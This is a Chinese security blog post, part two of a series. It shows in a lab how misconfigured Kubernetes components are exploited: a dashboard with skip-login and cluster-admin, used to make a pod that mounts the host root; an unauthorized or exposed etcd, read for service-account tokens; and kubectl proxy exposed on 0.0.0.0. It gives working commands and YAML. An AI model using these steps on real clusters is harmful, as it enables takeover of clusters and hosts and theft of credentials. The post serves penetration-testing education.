> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Bf8JrWrmmLPuanqcHe2big)

### 接云原生安全 - 配置不当或未鉴权利用（一）的内容，详情浏览

> 云原生安全 - 配置不当或未鉴权利用（一）
> 
> 无面人，公众号：冰蚕实验室[云原生安全 - 配置不当或未鉴权利用（一）](https://mp.weixin.qq.com/s/L8GTBWrzp3DV6oFPq8qqMw)

### **3. dashboard**

dashboard 是 Kubernetes 官方推出的控制 Kubernetes 的图形化界面，在 Kubernetes 配置不当导致 dashboard 未授权访问漏洞的情况下，通过 dashboard 我们可以控制整个集群。

在 dashboard 中默认是存在鉴权机制的，用户可以通过 kubeconfig 或者 Token 两种方式登录，当用户开启了 enable-skip-login 时可以在登录界面点击 Skip 跳过登录进入 dashboard。

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4Uef8C5swgBqg8W78mlzQms4KicX2VeIQzGWWGEPCffkibnUX0ahtXUiafehdUt8JUVoNZGBCgjTmhPzQ/640?wx_fmt=png)

#### **3.1. 环境准备**

开启 skip 跳过登录的功能

修改配置文件，在 201 行添加 - --enable-skip-login，意味着开启 skip 登录。如果是按照 k8s 部署章节配置的服务，便是在这一行添加。如果是自己配置的 k8s，可搜索 containers 来查找具体位置。

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4Uef8C5swgBqg8W78mlzQms4QH9vj5og0iaq4y8UA87Jd7aZYgoicpAuM4LZwR9j3akdMHYXtaFuFp8A/640?wx_fmt=png)

如果只开启 skip 登录，不配置权限，攻防时即使使用 skip 登录上去，也没有任何操作权限。

因为 Kubernetes 使用 RBAC(Role-based access control) 机制进行身份认证和权限管理，不同的 serviceaccount 拥有不同的集群权限。

我们点击 Skip 进入 dashboard 实际上使用的是 Kubernetes-dashboard 这个 ServiceAccount，如果此时该 ServiceAccount 没有配置特殊的权限，是默认没有办法达到控制集群任意功能的程度的。

如下图所示

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4Uef8C5swgBqg8W78mlzQms4oO7ic4IC6Qrp2eykxFG1xRiaVmXcfr8wRh6TiafK69ibMOq8XwZ1uMIekQ/640?wx_fmt=png)

配置文件所示权限如下

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4Uef8C5swgBqg8W78mlzQms41L4jSEYRVuiaQVXOEUHMgZm7SremGXL9RsdZZ47FlBw3LjTO70ibM0XA/640?wx_fmt=png)

有些开发者为了方便或者在测试环境中会为 Kubernetes-dashboard 绑定 cluster-admin 这个 ClusterRole（cluster-admin 拥有管理集群的最高权限）。

修改如下配置

注释掉原来的 kubernetes-dashboard 的 ServiceAccount；改为 cluster-admin

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4Uef8C5swgBqg8W78mlzQms4vXuQsJoPOia40czP08NgKnVx6qBfswbgwhUCMzf24y4xVVD2L2boa3A/640?wx_fmt=png)

修改完配置文件后，需要将原来的容器删除，否则会报如下错误

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4Uef8C5swgBqg8W78mlzQms4o0icO3aT5lSdl41RP6JoSHuE0X5BOO8Q8u5SbaW0abZbIbUBiaDeO0sg/640?wx_fmt=png)

删除原先的容器

```
kubectl delete -f dashboard-v2.4.0.yaml
```

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4Uef8C5swgBqg8W78mlzQms4rLBdLcibUczicPDIQtedMia87Wu3cBwyyCft0wAqEcPFPfgtNRLiaqIWSA/640?wx_fmt=png)

重新构建容器

```
kubectl apply -f /data/kubeadm/dashboard-v2.4.0.yaml
```

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4Uef8C5swgBqg8W78mlzQms4nv4jGDCCmtN5TicKKxic1deKQLIzc4PxibWrTJdHL2tibhrJdfMotQqRBA/640?wx_fmt=png)

查看 pods

```
kubectl get pods -A
```

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4Uef8C5swgBqg8W78mlzQms4h7TaaMicrM4tovZpS2CTuplwDNqmibNEicswBDh3ku9zn1KjC5YEebLRA/640?wx_fmt=png)

所有完成后，再次访问 dashboard

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4Uef8C5swgBqg8W78mlzQms4HkYag3OZhzicSOY3sat2vKriaAiaNbsJUzX1k1iaCeljEeBQB7gRSHiclJg/640?wx_fmt=png)

#### **3.2. 权限获取**

创建 pod

```
apiVersion: v1
kind: Pod
metadata:
  name: nginx
spec:
  containers:
  - image: nginx
    name: container
    volumeMounts:
    - mountPath: /tmp
      name: volume
  volumes:
  - name: volume
    hostPath:
      path: /
```

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4Uef8C5swgBqg8W78mlzQms4zMYr9doicycx9x9iaDvVic3ejuibcpoRQeibm7thu5ibktHULr1pKkwLxf3g/640?wx_fmt=png)

创建的 pod 的作用是，将宿主机的根目录挂载到容器的 / tmp 目录下，这样通过对 tmp 目录就可以管理 node 节点的根目录文件

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4Uef8C5swgBqg8W78mlzQms4euicO73FhV8a1pdUYI3L2AQ3q6icTb1zoEgNnKFiarZFOjzhtHcIOhWdw/640?wx_fmt=png)

到这里能直接管理宿主机根目录了，后续就不用多说了吧，嘿！至于如何逃逸详见

> 容器逃逸篇
> 
> 无面人，公众号：冰蚕实验室[云原生安全学习笔记 - 容器逃逸篇](https://mp.weixin.qq.com/s/KbpvqXIwXpTeZOFdcD7tPA)

为了集群的稳定性和安全性要求，在 Kubernetes 默认设计的情况下 Pod 是不能调度到 master 节点的，但如果用户自行设置关闭了 Master Only 状态，那么我们可以直接在 master 节点新建 Pod 更直接的控制 master node。

不过目前各大主流云产商上的 Kubernetes 集群服务，都会默认推荐让 Master 节点由云厂商托管，更加加剧了 Master 节点渗透和控制的难度 。

注：关闭了 Master Only 状态直接控制 master 节点待补充。

### **4. ETCD 未授权**

etcd 被广泛用于存储分布式系统或机器集群数据，其默认监听了 2379 等端口，如果 2379 端口暴露到公网，可能造成敏感信息泄露, Kubernetes 默认使用了 etcd v3 来存储数据，如果我们能够控制 Kubernetes etcd 服务，也就拥有了整个集群的控制权。

#### **4.1. 环境准备**

如今版本的 k8s 默认是只允许本地访问 2379 端口的，默认配置文件

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4Uef8C5swgBqg8W78mlzQms4cZicFc955raicAVWroLTZomBeroDoiaicB9ERMTf0AuP7ItqB68GicF6DIg/640?wx_fmt=png)

访问结果

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4Uef8C5swgBqg8W78mlzQms4g9cQCYkIOwNRP2hMZeqz2Q71OicdWF2VEuq5Ym1Xgp9Hib2ylJYSllHQ/640?wx_fmt=png)

将 etcd 监听的 host 修改为 0.0.0.0，--listen-client-urls=https://0.0.0.0:2379，目前版本无法实现远程访问，未查明原因。

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4Uef8C5swgBqg8W78mlzQms4Noib7mJN9YENJLcJVxmAgbQYpCwHNbv1XfxTcRGicaIqcjY1hXlkXq2g/640?wx_fmt=png)

未授权 etcd 下截图如下

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4Uef8C5swgBqg8W78mlzQms4DsIadaMS9k3wkhVicdeayT2qhjUIjPibnZsZvuWYSuV14ZH3FO868t2w/640?wx_fmt=png)

之前公众号发布过一篇关于 etcd 未授权的文章，通过未授权接管了整个公司的物联网设备（由于一张图片未打码删了）。但当时没学习过集群、云原生这种，所以也没考虑过获取集群 token，没有拿到更大的成果。后续也会把那篇内容重新发布出来。

#### **4.2. 权限获取**

通过 ectd 获取 Kubernetes 的认证鉴权 token 用于控制集群

默认情况下用 etcdctl 访问 2379 会需要证书

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4Uef8C5swgBqg8W78mlzQms4g9cQCYkIOwNRP2hMZeqz2Q71OicdWF2VEuq5Ym1Xgp9Hib2ylJYSllHQ/640?wx_fmt=png)

但是如果证书泄露了，就可以通过证书来获取 etcd

export ETCDCTL_CERT=/etc/kubernetes/pki/etcd/peer.crt

export ETCDCTL_CACERT=/etc/kubernetes/pki/etcd/ca.crt

export ETCDCTL_KEY=/etc/kubernetes/pki/etcd/peer.key

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4Uef8C5swgBqg8W78mlzQms4yyb22Z0iar3yjzicl0X2HFMQvpTAmJhNbANTzLa7K6OflEIcaQG9X66w/640?wx_fmt=png)

获取 token

```
/etcdctl --endpoints=https://127.0.0.1:2379/ get --keys-only --prefix=true "/" | grep /secrets/kube-system/clusterrole
```

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4Uef8C5swgBqg8W78mlzQms4ZcdG9icWRicbU81MV2iaFsa8X9hXLtNSwRtu0SGIyZSolrd9LVo3oreIA/640?wx_fmt=png)

```
./etcdctl --endpoints=https://127.0.0.1:2379/ get /registry/secrets/kube-system/clusterrole-aggregation-controller-token-*
```

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4Uef8C5swgBqg8W78mlzQms4jib5JAZ3ImbqTsEAtezl5s89pJAV5oPfN3JQUy1WGxlYAXLKibib3q8Uw/640?wx_fmt=png)

kubectl --insecure-skip-tls-verify -s https://127.0.0.1:6443 --token="" -n kube-system get pods

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4Uef8C5swgBqg8W78mlzQms4cq7YhZdkNyDX2xiam5IaicQKKVBvXw23yl1CBfOmiasoDq83AI36HtkibA/640?wx_fmt=png)

#### **4.3. 上述工具**

https://github.com/etcd-io/etcd/releases/tag/v3.4.20

### **5. kubectl proxy**

使用过 Kubernetes 的同学应该知道，如果你在集群的 POD 上开放一个端口并用 ClusterIP Service 绑定创建一个内部服务，如果没有开放 NodePort 或 LoadBalancer 等 Service 的话，你是无法在集群外网访问这个服务的。

#### **5.1 pod 和 service 的关系**

**Service 存在的意义**：防止 Pod 失联，准备找到提供同一个服务的 Pod**（服务发现）；**定义一组 Pod 的访问策略**（负载均衡）**

每个 Pod 都有自己的 IP 地址。当 controller 用新 Pod 替代发生故障的 Pod 时，新 Pod 会分配到新的 IP 地址。这样就产生了一个问题：如果一组 Pod 对外提供服务（比如 HTTP），它们的 IP 很有可能发生变化，那么客户端如何找到并访问这个服务呢？

Kubernetes 给出的解决方案是 Service。（Service 为了给客户端提供固定的访问端点，因此在客户端和服务端提供了中间层叫 Service，Service 名称解析是强依赖于 Dns 解析组件的，部署完 k8s 还需要部署 CoreDns）

**Service 三种类型**

**NodePort：**在每个节点上启用一个端口来暴露服务，可以在集群外部访问。也会分配一个稳定内部集群 IP 地址。

访问地址：<任意 NodeIP>:<NodePort>

端口范围：30000-32767

除了 Cluster 内部可以访问 Service，很多情况我们也希望应用的 Service 能够暴露给 Cluster 外部。Kubernetes 提供了多种类型的 Service，默认是 ClusterIP。

**ClusterIP:** Service 通过 Cluster 内部的 IP 对外提供服务，只有 Cluster 内的节点和 Pod 可访问，这是默认的 Service 类型。

**LoadBalancer：**与 NodePort 类似，在每个节点上启用一个端口来暴露服务。除此之外，Kubernetes 会请求底层云平台（例如阿里云、腾讯云、AWS 等）上的负载均衡器，将每个 Node （[NodeIP]:[NodePort]）作为后端添加进去

**Pod 与 Service 的关系**

• Service 通过标签关联一组 Pod

• Service 使用 iptables 或者 ipvs 为一组 Pod 提供负载均衡能力

Kubernetes Service 从逻辑上代表了一组 Pod，具体是哪些 Pod 则是由 label 来挑选。Service 有自己 IP，而且这个 IP 是不变的。客户端只需要访问 Service 的 IP，Kubernetes 则负责建立和维护 Service 与 Pod 的映射关系。无论后端 Pod 如何变化，对客户端不会有任何影响，因为 Service 没有变。

#### **5.2. 环境准备**

```
kubectl --insecure-skip-tls-verify proxy --accept-hosts=^.*$ --address=0.0.0.0
```

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4Uef8C5swgBqg8W78mlzQms4JkIBBsSnzMsmaGbmLOXZibiaAd5IkHInxRT3x4bIFr3PBdyEFmJIvCgQ/640?wx_fmt=png)

kubectl proxy 转发的是 apiserver 所有的能力，而且是默认不鉴权的，所以 --address=0.0.0.0 就是极其危险

#### **5.3. 权限获取**

查看一下接口信息

```
curl -i http://192.168.118.246:8001/api
```

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4Uef8C5swgBqg8W78mlzQms4vPqHHWurQtMHRmQQ7HpLfoWTvZYV9WXhgIqJzyHOPu4vaVx4nxe7BA/640?wx_fmt=png)

查看 pods

```
kubectl -s http://192.168.118.246:8001/ get pods
```

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4Uef8C5swgBqg8W78mlzQms4PdXbwZPibwy2D8IeUIcvjxnSX5Cpx1rOmEJ1icOYM8ibiabYLCmY8L9IWA/640?wx_fmt=png)

后续利用方法和 apiserver 小节一样

**总结**

此次分享了三个利用方法：dashboard（配置不当，可跳过登录）、etcd（远程未授权）、kubectl proxy（配置不当）；加上（一）中的内容，算是分享了 5 种常见的 k8s 攻击利用方法，还有一些其他的接口以后有时间接着写。